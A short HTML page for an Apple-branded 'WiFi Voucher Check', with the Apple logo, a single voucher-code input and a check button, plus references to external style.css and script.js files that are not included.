<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple WiFi Voucher Check</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
        <h1>Apple WiFi</h1>
        <p class="subtitle">Voucher Validity Check</p>
        <form id="voucher-form">
            <input type="text" id="voucher-code" placeholder="Enter Voucher Code" required>
            <button type="submit">Check</button>
        </form>
        <div id="result"></div>
    </div>
    <script src="script.js"></script>
</body>
</html>
